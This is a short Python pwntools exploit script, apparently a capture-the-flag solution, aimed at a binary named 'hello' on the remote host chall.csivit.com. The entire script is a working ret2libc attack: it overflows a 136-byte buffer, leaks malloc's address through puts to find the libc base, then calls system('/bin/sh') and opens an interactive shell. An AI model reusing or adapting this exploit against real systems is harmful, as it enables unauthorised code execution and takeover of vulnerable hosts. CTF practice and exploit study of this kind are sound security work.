#!/usr/bin/env python3

from pwn import *

exe = ELF("hello")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.23.so")
rop = ROP("./hello")
context.binary = exe


def conn():
    return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})


def main():
    #r = conn()
    r = remote("chall.csivit.com", 30046)

    print(r.recvline())
    offset = 136

    payload  = b"M"*offset
    payload += p32(exe.plt["puts"])
    payload += p32(exe.sym["main"])
    payload += p32(exe.got["malloc"])
    r.sendline(payload)


    r.recvuntil("!\n")
    malloc = u32(r.recv(4))
    libc_base = malloc - libc.sym["malloc"]
    log.info("Libc base address is 0x%x", libc_base)

    system = libc_base + libc.sym["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh"))

    payload2  = b"M"*offset
    payload2 += p32(system)
    payload2 += b"MMMM"
    payload2 += p32(binsh)

    for _ in range(2):
        r.recvline()
    r.sendline(payload2)

    r.interactive()


if __name__ == "__main__":
    main()
